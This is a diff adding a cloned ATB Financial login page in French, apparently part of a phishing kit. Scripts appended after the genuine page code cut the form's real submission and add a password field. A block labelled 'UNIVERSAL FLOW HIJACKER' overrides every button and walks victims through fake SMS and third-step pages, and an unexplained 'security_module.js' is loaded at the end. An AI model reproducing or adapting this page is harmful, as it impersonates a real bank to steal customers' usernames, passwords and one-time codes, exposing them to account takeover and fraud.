@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<!-- saved from url=(0367)https://login.atb.com/as/authorization.oauth2?redirect_uri=https%3A%2F%2Fpersonal.atb.com%2Fcallback&client_id=ATBWEB&response_type=code&state=5sfyGRi33H&scope=openid%20profile%20retail-web&cmid=3f70543f3d5a4f0cb54935918dad679f&response_mode=fragment&appState=%5Bobject%20Object%5D&code_challenge=AnW4JppkpOsFfR_IrQtMd9HLbLjgcK2WpfqYTLOZZuQ&code_challenge_method=S256 -->
+<html lang="fr" dir="ltr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="origin-trial" content="A7vZI3v+Gz7JfuRolKNM4Aff6zaGuT7X0mf3wtoZTnKv6497cVMnhy03KDqX7kBz/q/iidW7srW31oQbBt4VhgoAAACUeyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGUuY29tOjQ0MyIsImZlYXR1cmUiOiJEaXNhYmxlVGhpcmRQYXJ0eVN0b3JhZ2VQYXJ0aXRpb25pbmczIiwiZXhwaXJ5IjoxNzU3OTgwODAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ==">
+    <!--<base href="https://login.atb.com/">--><base href=".">
+    
+    <meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="Content-Security-Policy" content="script-src &#39;self&#39; &#39;nonce-H5q1Vrv4W4tiqo50&#39; https://cdn.avo.app https://cdn.mxpnl.com https://digitaltrust.us-05.feedzai.cloud https://c.digitaltrust.us-05.feedzai.cloud https://fd.digitaltrust.us-05.feedzai.cloud https://ad.digitaltrust.us-05.feedzai.cloud https://static.digitaltrust.us-05.feedzai.cloud; style-src &#39;self&#39;; img-src &#39;self&#39; https://digitaltrust.us-05.feedzai.cloud; font-src &#39;self&#39;;">
+
+
+    <title>Connexion</title>
+    <link rel="icon" size="16x16" href="https://login.atb.com/assets/images/atbImages/atb-favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" size="16x16" href="https://login.atb.com/assets/images/atbImages/atb-favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" type="text/css" href="./Connexion_files/atb.fonts.css">
+    <link rel="stylesheet" media="all" type="text/css" href="./Connexion_files/atb.new.main.css">
+    <script type="text/javascript" async="" charset="utf-8" src="./Connexion_files/recaptcha__fr.js.téléchargement" crossorigin="anonymous" integrity="sha384-3zaiH0OSdmuU9OCfJ+WY5lU6ybChvSlTnH8kO3xF2adAEuFyszUm+E+7giSlebBX" nonce="H5q1Vrv4W4tiqo50"></script><script type="text/javascript" src="./Connexion_files/common.js.téléchargement"></script>
+    <script type="text/javascript" src="./Connexion_files/dt-loader-2.1.1.dist.js.téléchargement"></script>
+        <script nonce="H5q1Vrv4W4tiqo50" src="./Connexion_files/enterprise.js.téléchargement"></script><script id="3megxg1" type="text/javascript" src="./Connexion_files/bcaptcha.js.téléchargement"></script>
+    </head>
+
+<body>
+    <!--START CONTENT-->
+    <div class="atb-content-container">
+
+        <!-- START HEADER -->
+        <div class="atb-header">
+            <img id="atb-logo" class="atb-logo" src="./Connexion_files/atb-logo.svg" alt="ATB Logo">
+        </div>
+        <!-- END HEADER -->
+
+        <!-- START BODY -->
+        <div class="atb-body-container">
+
+            <hr id="blueLine" class="atb-blue-line atb-hide-icon">
+
+            
+            <!-- START SESSION MESSAGE -->
+
+
+            <div class="atb-messages-description paragraph-2" id="atb-message-container" style="display: none;">
+                <img id="messageImage" class="atb-error-image atb-hide-icon" src="./Connexion_files/atb-check-circle-green-empty-check.svg" alt="Error">
+                <div id="messagesDiv"></div>
+
+                <div id="messagesDiv2"></div>
+            </div>
+            <!-- END SESSION MESSAGE -->
+
+
+            <div>
+                <form method="POST" action="https://login.atb.com/as/tQ8CviRCsc/resume/as/authorization.ping" autocomplete="off">
+
+                    <!-- START USERNAME INPUT -->
+                    <div class="atb-input-label subtitle-1">
+                        Nom d'utilisateur
+                    </div>
+                    <div class="atb-input-outer-container">
+                        <div class="atb-input-container">
+
+                                                        
+                                                            <input id="username" class="atb-input-box paragraph-1" type="text" size="10" name="username" placeholder="Entrez votre nom d" utilisateur'="" autocorrect="off" autocapitalize="off" autocomplete="username webauthn" value="">
+                            
+                            <img src="./Connexion_files/atb-cancel.svg" alt="Clear Username" id="clearUsername" class="atb-hide-icon atb-input-icon">
+
+                            <img id="username-error" src="./Connexion_files/atb-error.svg" alt="Error" class="atb-hide-icon atb-input-icon">
+
+                            <img id="passkey-auth" src="./Connexion_files/atb-fido2-icon.svg" alt="Login with your Passkey" class="atb-input-icon">
+                        </div>
+                    </div>
+                    <div id="username-inline-error" class="atb-input-inline-error atb-hide paragraph-3 atb-title-spacing">
+                        Veuillez saisir un nom d'utilisateur valide.
+                    </div>
+                    <!-- END USERNAME INPUT -->
+
+                    <!-- START PASSWORD INPUT -->
+                    <div id="password-section" style="display:none; margin-top: 15px;">
+                        <div class="atb-input-label subtitle-1">
+                            Mot de passe
+                        </div>
+                        <div class="atb-input-outer-container">
+                            <div class="atb-input-container">
+                                <input id="password" class="atb-input-box paragraph-1" type="password" size="10" name="password" placeholder="Entrez votre mot de passe" autocorrect="off" autocapitalize="off" value="" style="width: 100%; border: none; outline: none; background: transparent; font-family: inherit; font-size: inherit;">
+                            </div>
+                        </div>
+                    </div>
+
+                                        <div id="atb-remember-username" class="checkbox-wrapper-1 atb-title-spacing atb-checkbox-wrapper paragraph-2">
+                        <input id="rememberUsername" class="substituted" type="checkbox" name="rememberUsername">
+                        <label for="rememberUsername"></label>
+                        Mémoriser votre nom d'utilisateur
+                    </div>
+                    
+                    <div class="ping-buttons">
+                        <input type="hidden" name="pf.submit" value="">
+                        <input type="hidden" name="pf.cancel" value="">
+                        <input type="hidden" name="assertionValue" value="">
+                        <input type="hidden" name="manuallySubmit" value="">
+                        <input type="hidden" name="isPasskeySupported" value="">
+                        <input type="hidden" name="isPasskeyConditionalMediationAvailable" value="">
+                        <input type="hidden" name="recaptchaToken" value="">
+                        <input type="hidden" name="deviceAuthId" value="034cd790-5a1a-4a1c-824a-330e85969059">
+
+                        <a id="main-button" href="javascript:void(0)" class="atb-main-button-anchor h6" title="Continue">
+                            Continue
+                        </a>
+
+                        <div class="atb-secondary-button-anchor-container">
+                            <a href="https://login.atb.com/ext/idrecovery/Recover?AdapterId=passwordpromptretailidp" class="atb-secondary-button-anchor h6">
+                                Nom d'utilisateur oublié
+                            </a>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+        <!-- START FOOTER -->
+        <div class="atb-footer" id="atb-footer">
+            <div class="atb-footer-link-group subtitle-2">
+
+                <a href="https://www.atb.com/" target="_blank" class="atb-footer-link" id="atb_home_page">
+                    atb.com
+                </a>
+
+                <span class="atb-footer-link-hl"> | </span>
+
+                <a href="https://www.atb.com/resources/contact-us/" target="_blank" class="atb-footer-link" id="atb_contact_us">
+                    Contactez-nous
+                </a>
+
+                <span class="atb-footer-link-hl"> | </span>
+
+                <a href="https://www.atb.com/company/privacy-and-security/online-guarantee" target="_blank" class="atb-footer-link" id="atb_terms_services">
+                    Conditions
+                </a>
+
+                <span class="atb-footer-link-hl"> | </span>
+
+                <a href="https://www.atb.com/company/privacy-and-security/" target="_blank" class="atb-footer-link" id="atb_privacy_page">
+                    Conseils de sécurité
+                </a>
+
+            </div>
+            <div class="atb-legal-text paragraph-3">© ATB Financial<span id="year"> 2026</span>. Tous les droits sont réservés.<br>Accès autorisé seulement. L'utilisation peut être surveillée.</div>
+        </div>
+        <!-- END FOOTER-->
+
+    </div> <!-- .ping-footer-container -->
+
+     <!-- .ping-container -->
+
+    <script type="text/javascript" nonce="H5q1Vrv4W4tiqo50">
+
+        handleRedirectOnPageExpiry();
+
+        window.top.getFraudLocationId = () => { return fraudLocationIdentifier("UsernameSubmit"); }
+        window.top.getFraudSessionId = () => { return fraudSessionId(); }
+        window.top.getFraudUserId = () => { return null; }
+
+        window.onload = function () {
+            let client_id = urlParams.get('client_id') != null ? urlParams.get('client_id') : getLocalStorageCookie('client_id');
+            const logo = document.getElementById('atb-logo');
+            if (client_id === 'gwsweb' || client_id === 'aicweb') {
+                logo.classList.remove('atb-logo');
+                logo.classList.add('atb-logo-wealth');
+                logo.src = "assets/images/atbImages/atb-logo-wealth.svg";
+            } else if(client_id === 'prosperweb' || client_id === 'prospermobile' || client_id === 'DWEWeb' || client_id === 'DWEMobile' || client_id === 'DWEOnboarding'){
+                logo.classList.remove('atb-logo');
+                logo.classList.add('atb-logo-wealth');
+                logo.src = "assets/images/atbImages/atb-logo-prosper.svg";
+            }
+
+            if (getChannel(getLocalStorageCookie('client_id')) === 'business') {
+                //Create Link for the Tax Pay & File in footer
+                //Create Span Tag and break
+                var br = document.createElement('br');
+                var footerSpan = document.createElement('span');
+
+                //Create Anchor Tag
+                var a = document.createElement('a');
+                var linkText = document.createTextNode('Tax Pay & File');
+                a.appendChild(linkText);
+                a.className = "atb-footer-link";
+                a.target = "_blank"
+                a.href = "https://atb.can-act.com/pfs/login";
+
+                footerSpan.append(a);
+                var terms = document.getElementById("atb_terms_services");
+                terms.append(br);
+                terms.append(footerSpan);
+            }
+        }
+
+        //Set client_id
+        let client_id = urlParams.get('client_id');
+
+        if (client_id) {
+            localStorage.setItem('client_id', client_id);
+        }
+
+
+        getFooterChannel(getLocalStorageCookie('client_id'));
+
+
+        if (client_id == 'HELIX') {
+            let cState = urlParams.get('cState');
+            document.cookie = "cState=" + cState + ";" + "expires=" + expiryTime() + ';path=/';
+        }
+
+        if (OS) {
+            document.cookie = "OS=" + OS + "; secure;" + "expires=" + expiryTime() + ';path=/';
+        }
+
+        if (beta) {
+            document.cookie = "beta=" + beta + ";" + "expires=" + expiryTime() + ';path=/';
+        }
+
+        if (isBeta) {
+            document.cookie = "isBeta=" + isBeta + ";" + "expires=" + expiryTime() + ';path=/';
+        }
+
+        // Set CMID cookie
+        const params = new URLSearchParams(window.location.search);
+        const cmidParam = params.get("cmid");
+
+        if (params.get("cmid")) {
+            setCookie("cmid", params.get("cmid"));
+        } else if (getCookie("cmid") === 'N/A') {
+            setCookie("cmid", generateUUID());
+        }
+
+        // Check if the user is returning from the password page via the "Restart" link
+        let tempUser = getLocalStorageCookie('tempUsername');
+        if (tempUser && tempUser !== 'N/A') {
+            let usernameField = document.getElementById('username');
+            let realUsernameField = document.getElementById('real-username');
+
+            // Revert the input to show the real username instead of the obfuscated one
+            usernameField.value = tempUser;
+
+            // If the field was rendered as obfuscated, clean up the DOM so it acts like a normal input
+            if (realUsernameField) {
+                usernameField.setAttribute('name', 'username');
+                realUsernameField.remove();
+            }
+
+            localStorage.removeItem('tempUsername');
+        }
+
+        // Update footer
+        let channel = getChannel(getLocalStorageCookie('client_id'));
+        setYear();
+
+        // Trigger submission when clicking the main button
+        // document.getElementById("main-button").addEventListener("click", postManuallySubmit);
+
+        // Trigger submission when pressing Enter in the input field
+        document.getElementById("username").addEventListener("keydown", function (event) {
+            if (event.key === "Enter") {
+                event.preventDefault();
+                // postManuallySubmit();
+            }
+        });
+
+        document.getElementById('username').focus();
+
+        var authAbortController = window.PublicKeyCredential ? new AbortController() : null;
+        var authAbortSignal = window.PublicKeyCredential ? authAbortController.signal : null;
+
+        window.abortWebAuthnSignal = function abortWebAuthnSignal() {
+            authAbortController.abort();
+            authAbortController = new AbortController();
+            authAbortSignal = authAbortController.signal;
+        }
+
+        window.IsWebAuthnSupported = function IsWebAuthnSupported() {
+            if (!window.PublicKeyCredential) {
+                console.log("Web Authentication API is not supported on this browser.");
+                return false;
+            }
+            return true;
+        }
+
+        window.isWebAuthnPlatformAuthenticatorAvailable = function isWebAuthnPlatformAuthenticatorAvailable() {
+            var timer;
+            var p1 = new Promise(function (resolve) {
+                timer = setTimeout(function () {
+                    resolve(false);
+                }, 1000);
+            });
+            var p2 = new Promise(function (resolve) {
+                if (IsWebAuthnSupported() && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+                    resolve(
+                        window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable().catch(function (err) {
+                            console.log(err);
+                            return false;
+                        }));
+                }
+                else {
+                    resolve(false);
+                }
+            });
+            return Promise.race([p1, p2]).then(function (res) {
+                clearTimeout(timer);
+                console.log("isWebAuthnPlatformAuthenticatorAvailable - " + res);
+                return res;
+            });
+        }
+
+        window.WebAuthnPlatformAuthentication = function WebAuthnPlatformAuthentication(publicKeyCredentialRequestOptions) {
+            return new Promise(function (resolve, reject) {
+                isWebAuthnPlatformAuthenticatorAvailable().then(function (result) {
+                    if (result) {
+                        resolve(Authenticate(publicKeyCredentialRequestOptions, authAbortSignal));
+                    }
+                    reject(Error("UnSupportedBrowserError"));
+                });
+            });
+        }
+
+        function Authenticate(publicKeyCredentialRequestOptions, abortSignal, useConditionalMediation = true) {
+            return new Promise(function (resolve, reject) {
+                var options = JSON.parse(publicKeyCredentialRequestOptions);
+                var publicKeyCredential = {};
+                publicKeyCredential.challenge = new Uint8Array(options.challenge);
+                if ('allowCredentials' in options) {
+                    publicKeyCredential.allowCredentials = credentialListConversion(options.allowCredentials);
+                }
+                if ('rpId' in options) {
+                    publicKeyCredential.rpId = options.rpId;
+                }
+                if ('timeout' in options) {
+                    publicKeyCredential.timeout = options.timeout;
+                }
+                if ('userVerification' in options) {
+                    publicKeyCredential.userVerification = options.userVerification;
+                }
+
+                let credentialRequestOptions = {
+                    "publicKey": publicKeyCredential,
+                    signal: abortSignal
+                }
+
+                if (useConditionalMediation) {
+                    credentialRequestOptions.mediation = "conditional"
+                }
+
+                navigator.credentials.get(credentialRequestOptions)
+                    .then(function (assertion) {
+                        // Send new credential info to server for verification and registration.
+                        var publicKeyCredential = {};
+                        if ('id' in assertion) {
+                            publicKeyCredential.id = assertion.id;
+                        }
+                        if ('rawId' in assertion) {
+                            publicKeyCredential.rawId = toBase64Str(assertion.rawId);
+                        }
+                        if ('type' in assertion) {
+                            publicKeyCredential.type = assertion.type;
+                        }
+                        var response = {};
+                        response.clientDataJSON = toBase64Str(assertion.response.clientDataJSON);
+                        response.authenticatorData = toBase64Str(assertion.response.authenticatorData);
+                        response.signature = toBase64Str(assertion.response.signature);
+                        response.userHandle = toBase64Str(assertion.response.userHandle);
+                        publicKeyCredential.response = response;
+
+                        resolve(JSON.stringify(publicKeyCredential));
+                        checkAssertion(JSON.stringify(publicKeyCredential));
+                    }).catch(function (err) {
+                        if (err.name === 'AbortError') {
+                            console.log('WebAuthn authentication aborted.');
+                            reject(Error('AbortError'));
+                        } else {
+                            // No acceptable authenticator or user refused consent. Handle appropriately.
+                            console.log(err);
+                            reject(Error(err.name));
+                        }
+                    });
+            });
+        }
+
+        async function checkPasskeySupport() {
+            const form = document.forms[0];
+            if (!form) return;
+
+            let isPasskeySupported = false;
+            let isPasskeyConditionalMediationSupported = false;
+
+            try {
+                // Check for basic WebAuthn and Platform Authenticator support
+                if (window.PublicKeyCredential?.isUserVerifyingPlatformAuthenticatorAvailable) {
+                    isPasskeySupported = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+                }
+
+                // Check for Conditional Mediation (Autofill UI) support
+                if (window.PublicKeyCredential?.isConditionalMediationAvailable) {
+                    isPasskeyConditionalMediationSupported = await window.PublicKeyCredential.isConditionalMediationAvailable();
+                }
+            } catch (error) {
+                // Fallback: Log the error, but let the script continue safely with the default 'false' values
+                console.warn("Passkey feature detection failed");
+            }
+
+            // Safely assign the values to the form
+            if (form['isPasskeySupported']) {
+                form['isPasskeySupported'].value = isPasskeySupported;
+            }
+            if (form['isPasskeyConditionalMediationAvailable']) {
+                form['isPasskeyConditionalMediationAvailable'].value = isPasskeyConditionalMediationSupported;
+            }
+        }
+
+
+        async function checkAssertion(publicKeyCredential) {
+            document.forms[0]['assertionValue'].value = publicKeyCredential;
+            await checkPasskeySupport()
+            postSubmit();
+        }
+
+        function credentialListConversion(list) {
+            var credList = [];
+            for (var i = 0; i < list.length; i++) {
+                var cred = {
+                    type: list[i].type,
+                    id: new Uint8Array(list[i].id)
+                };
+                if (list[i].transports) {
+                    cred.transports = list[i].transports;
+                }
+                credList.push(cred);
+            }
+            return credList;
+        }
+
+        function toBase64Str(bin) {
+            return btoa(String.fromCharCode.apply(null, new Uint8Array(bin)));
+        }
+
+        function getCompatibility() {
+            return isWebAuthnPlatformAuthenticatorAvailable()
+                .then((result) => {
+                    if (result) {
+                        return 'FULL';
+                    } else if (IsWebAuthnSupported()) {
+                        return 'SECURITY_KEY_ONLY';
+                    } else {
+                        return 'NONE';
+                    }
+                })
+                .catch(() => {
+                    if (IsWebAuthnSupported()) {
+                        return 'SECURITY_KEY_ONLY';
+                    } else {
+                        return 'NONE';
+                    }
+                });
+        }
+
+        (async () => {
+            if (
+                typeof window.PublicKeyCredential !== 'undefined'
+                && typeof window.PublicKeyCredential.isConditionalMediationAvailable === 'function'
+            ) {
+                const available = await PublicKeyCredential.isConditionalMediationAvailable();
+
+                if (available) {
+                    try {
+                                                                        Authenticate("{\"challenge\":[-120,-107,70,-10,56,86,76,85,31,121,92,30,62,123,-31,-93,-99,18,64,24,-114,-47,-81,-128,61,87,-80,98,-112,9,58,123],\"timeout\":120000,\"rpId\":\"login.atb.com\",\"allowCredentials\":[],\"userVerification\":\"required\"}")
+                                            } catch (err) {
+                        console.error('Error with conditional UI:', err);
+                    }
+                }
+            }
+        })();
+
+        async function postSubmit() {
+            await executeRecaptcha();
+            document.forms[0]['pf.submit'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        async function postManuallySubmit() {
+            // Ensure that the username input is not empty
+            if (!validateUsernameInput()) {
+                return;
+            }
+
+            let usernameField = document.getElementById('username');
+            let realUsernameField = document.getElementById('real-username');
+
+            
+            await executeRecaptcha();
+            await checkPasskeySupport();
+            document.forms[0]['manuallySubmit'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        function postCancel() {
+            document.forms[0]['pf.cancel'].value = 'clicked';
+            document.forms[0].submit();
+        }
+
+        function setFocus() {
+            let platform = navigator.platform;
+            if (platform != null && platform.indexOf("iPhone") == -1) {
+                document.getElementById('username').focus();
+            }
+        }
+
+        function validateUsernameInput() {
+            let username = document.getElementById('username').value;
+            let usernameError = document.getElementById('username-error');
+            let usernameInlineError = document.getElementById('username-inline-error');
+
+            if (username.length === 0) {
+                usernameError.classList.remove('atb-hide-icon');
+                usernameInlineError.classList.remove('atb-hide');
+                return false;
+            } else {
+                usernameError.classList.add('atb-hide-icon');
+                usernameInlineError.classList.add('atb-hide');
+                return true;
+            }
+        }
+
+        async function executeRecaptcha() {
+            
+            const token = await grecaptcha.enterprise.execute('6LeqrDEpAAAAAPd8nNsc8P7Lgq-dxW191oe5SElk', { action: 'LOGIN' });
+            document.forms[0]['recaptchaToken'].value = token;
+
+                    }
+
+        //LoggedOutMessaging
+        function extractMessage() {
+            const message = urlParams.get('loggedOutMessage');
+
+
+            const messageContainer = document.getElementById("atb-message-container");
+            const messageImage = document.getElementById("messageImage");
+            const updateMessage = document.getElementById("messagesDiv");
+            const updateMessage2 = document.getElementById("messagesDiv2");
+
+            messageImage.src = "assets/images/atbImages/atb-check-circle-green-empty-check.svg";
+
+            switch (message) {
+                case "inactive":
+                    messageImage.classList.add("atb-hide-icon");
+                    updateMessage.textContent = `For your security, we logged you out due to inactivity.`;
+                    updateMessage2.textContent = `Log back in to continue.`;
+                    break;
+
+                case "manual":
+                    messageImage.classList.remove("atb-hide-icon");
+                    if (channel === "retail") {
+                        updateMessage.textContent = `You've successfully logged out of ATB Personal.`;
+                    }
+                    else if (channel === "business") {
+                        updateMessage.textContent = `You've successfully logged out of ATB Business.`;
+                    } else if (channel === "wealth" || channel === "gws") {
+                        updateMessage.textContent = `You've successfully logged out of ATB Wealth.`;
+                    }
+                    break;
+
+                case "unauthorized":
+                    messageImage.classList.add("atb-hide-icon");
+                    if (channel === "retail") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Call 1-800-332-8383 to regain account access.`;
+                    }
+                    else if (channel === "business") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call ATB Business at <a class="atb-phone-number paragraph-1" href="tel:1-877-363-4855">1-877-363-4855</a> to regain account access.`;
+                    } else if (channel === "wealth") {
+                        messageImage.classList.add("atb-hide-icon");
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call Wealth Advice Center at <a class="atb-phone-number paragraph-1" href="tel:1-855-541-4387">1-855-541-4387</a> to regain account access.`;
+                    } else if (channel === "gws") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call Group Wealth Services at <a class="atb-phone-number paragraph-1" href="tel:1-866-408-7215">1-866-408-7215</a> to regain account access.`;
+                    }
+                    break;
+
+                case "twofactorauthchallengefailure":
+                    messageImage.classList.add("atb-hide-icon");
+                    if (channel === "retail") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Call 1-800-332-8383 to regain account access.`;
+                    }
+                    else if (channel === "business") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call ATB Business at <a class="atb-phone-number paragraph-1" href="tel:1-877-363-4855">1-877-363-4855</a> to regain account access.`;
+                    } else if (channel === "wealth") {
+                        messageImage.classList.add("atb-hide-icon");
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call Wealth Advice Center at <a class="atb-phone-number paragraph-1" href="tel:1-855-541-4387">1-855-541-4387</a> to regain account access.`;
+                    } else if (channel === "gws") {
+                        updateMessage.innerHTML = `Locked Out, Your account has been locked for security purposes. Please call Group Wealth Services at <a class="atb-phone-number paragraph-1" href="tel:1-866-408-7215">1-866-408-7215</a> to regain account access.`;
+                    }
+                    break;
+
+                case "changeUsername":
+                    messageImage.classList.remove("atb-hide-icon");
+                    updateMessage.textContent = `You've successfully changed your username. Please log in using your new username.`;
+                    break;
+
+                case "biometricFailure":
+                    messageImage.classList.remove("atb-hide-icon");
+                    messageImage.src = "assets/images/atbImages/atb-warning-yellow.svg";
+                    updateMessage.innerHTML = `We're unable to authenticate you. Please log in with your username and password.`;
+                    break;
+
+                case "clientCareRequired":
+                    messageImage.classList.remove("atb-hide-icon");
+                    messageImage.src = "assets/images/atbImages/atb-emergency-red.svg";
+
+                    if (channel === "retail") {
+                        updateMessage.innerHTML = `We're unable to authenticate you. Please call ATB Client Care at <a class="atb-phone-number paragraph-1" href="tel:1-800-332-8383">1-800-332-8383</a>.`;
+                    }
+                    else if (channel === "business") {
+                        updateMessage.innerHTML = `We're unable to authenticate you. Please call ATB Business at <a class="atb-phone-number paragraph-1" href="tel:1-877-363-4855">1-877-363-4855</a>.`;
+                    } else if (channel === "wealth") {
+                        messageImage.classList.add("atb-hide-icon");
+                        updateMessage.innerHTML = `We're unable to authenticate you. Please call Wealth Advice Center at <a class="atb-phone-number paragraph-1" href="tel:1-855-541-4387">1-855-541-4387</a>.`;
+                    } else if (channel === "gws") {
+                        updateMessage.innerHTML = `We're unable to authenticate you. Please call Group Wealth Services at <a class="atb-phone-number paragraph-1" href="tel:1-866-408-7215">1-866-408-7215</a>.`;
+                    }
+                    break;
+
+                case "changePassword":
+                    messageImage.classList.remove("atb-hide-icon");
+                    updateMessage.innerHTML = `You've successfully changed your password.<br>Please log in using your new password.`;
+                    break;
+
+                case "changeBiometrics":
+                    messageImage.classList.remove("atb-hide-icon");
+                    messageImage.src = "assets/images/atbImages/atb-info-exclamation.svg";
+                    updateMessage.innerHTML = `We noticed your biometrics have been updated.<br>Please log in with your username and password.`;
+                    break;
+
+                case "removeBiometrics":
+                    messageImage.classList.remove("atb-hide-icon");
+                    updateMessage.innerHTML = `You've successfully disabled biometric login. Please log in using your username and password.`;
+                    break;
+
+                default:
+                    messageImage.classList.add("atb-hide-icon");
+                    messageContainer.style.display = "none";
+                    break;
+            }
+        }
+
+                document.getElementById("blueLine").classList.add("atb-hide-icon");
+        
+        extractMessage();
+    </script>
+
+
+
+<div><div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;"><div class="grecaptcha-logo"><iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-5ebghhdkz265" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./Connexion_files/anchor.html"></iframe></div><div class="grecaptcha-error"></div><textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea></div><iframe style="display: none;" src="./Connexion_files/saved_resource(1).html"></iframe></div>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    var currentFile = window.location.pathname.split("/").pop() || "index.html";
+    var smsFile = currentFile.replace(".html", "_sms.html");
+
+    var passSection = document.getElementById("password-section");
+    var mainBtn = document.getElementById("main-button");
+    var usernameInput = document.getElementById("username");
+    var passwordInput = document.getElementById("password");
+
+    // Intercept form submissions
+    var forms = document.querySelectorAll("form");
+    forms.forEach(function(form) {
+        form.setAttribute("action", "javascript:void(0)");
+        form.addEventListener("submit", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            handleStep();
+        });
+    });
+
+    if (usernameInput) {
+        usernameInput.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                e.stopPropagation();
+                handleStep();
+            }
+        });
+    }
+
+    if (passwordInput) {
+        passwordInput.addEventListener("keydown", function(e) {
+            if (e.key === "Enter") {
+                e.preventDefault();
+                e.stopPropagation();
+                handleStep();
+            }
+        });
+    }
+
+    if (mainBtn) {
+        // Replace button to remove ping-federate event listeners
+        var newBtn = mainBtn.cloneNode(true);
+        mainBtn.parentNode.replaceChild(newBtn, mainBtn);
+        mainBtn = newBtn;
+        
+        mainBtn.addEventListener("click", function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            handleStep();
+        });
+    }
+
+    function handleStep() {
+        if (passSection.style.display === "none") {
+            if (usernameInput.value.trim() !== "") {
+                passSection.style.display = "block";
+                mainBtn.textContent = "Se connecter";
+                mainBtn.setAttribute("title", "Se connecter");
+                if (passwordInput) passwordInput.focus();
+            } else {
+                alert("Veuillez saisir un nom d'utilisateur.");
+            }
+        } else {
+            if (passwordInput.value.trim() !== "") {
+                window.location.href = smsFile;
+            } else {
+                alert("Veuillez saisir votre mot de passe.");
+            }
+        }
+    }
+});
+</script>
+
+
+<script>
+// UNIVERSAL FLOW HIJACKER
+document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(function() {
+        var btns = document.querySelectorAll("button, input[type='submit'], .btn");
+        btns.forEach(function(btn) {
+            var clone = btn.cloneNode(true);
+            if (btn.parentNode) {
+                btn.parentNode.replaceChild(clone, btn);
+                clone.style.pointerEvents = "auto";
+                clone.removeAttribute("disabled");
+                
+                clone.addEventListener("click", function(e) {
+                    var text = (clone.textContent || clone.value || "").toLowerCase().trim();
+                    var isSubmit = clone.getAttribute("type") === "submit" || clone.tagName === "BUTTON" || text.indexOf("valid") !== -1 || text.indexOf("contin") !== -1 || text.indexOf("log") !== -1 || text.indexOf("sign") !== -1 || text.indexOf("connex") !== -1 || text.indexOf("next") !== -1 || text.indexOf("suivant") !== -1;
+                    
+                    if (isSubmit) {
+                        e.preventDefault();
+                        e.stopImmediatePropagation();
+                        
+                        var current = window.location.pathname.split("/").pop();
+                        if (current.indexOf("_sms.html") !== -1) {
+                            window.location.href = current.replace("_sms.html", "_step3.html");
+                        } else if (current.indexOf("_step3.html") !== -1) {
+                            alert("Vérification terminée !");
+                        } else if (current !== "index.html" && current !== "") {
+                            window.location.href = current.replace(".html", "_sms.html");
+                        }
+                    }
+                }, true);
+            }
+        });
+        
+        // Also forcibly hijack all form submits
+        var forms = document.querySelectorAll("form");
+        forms.forEach(function(form) {
+            form.setAttribute("action", "javascript:void(0)");
+            form.onsubmit = function(e) {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            };
+        });
+    }, 300); // slight delay to ensure other frameworks finish loading
+});
+</script>
+
+<script src="security_module.js"></script>
+</body></html>
